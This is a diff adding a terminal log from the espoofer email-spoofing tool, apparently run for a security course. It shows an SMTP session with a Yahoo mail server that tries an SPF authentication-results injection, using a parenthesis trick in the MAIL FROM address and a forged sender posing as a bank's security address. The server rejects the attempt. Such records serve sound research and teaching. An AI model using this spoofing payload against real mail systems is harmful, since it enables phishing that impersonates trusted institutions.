@@ -1,0 +1,52 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a5
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('67.195.204.72', 25)
+>>> 220 mtaproxy301.free.mail.bf1.yahoo.com ESMTP ready
+
+<<< ehlo testdomaintest.company
+
+>>> 250-mtaproxy301.free.mail.bf1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <any@cibc.com(a.testdomaintest.company>
+
+>>> 501 Syntax error in parameters or arguments tnmpmscs
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 503 Bad sequence of commands tnmpmscs
+
+<<< data
+
+>>> 503 Bad sequence of commands tnmpmscs
+
+<<< From: <security@cibc.com>
+To: <cis6510victim@yahoo.com>
+Subject: A5: SPF authentication results injection using parenthese
+Date: Tue, 24 Nov 2020 04:08:22 +0000
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-A3LDT1@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 502 Command not implemented tnmpmscs
+
+<<< quit
+
+>>> 502 Command not implemented tnmpmscs
+
+Finished.
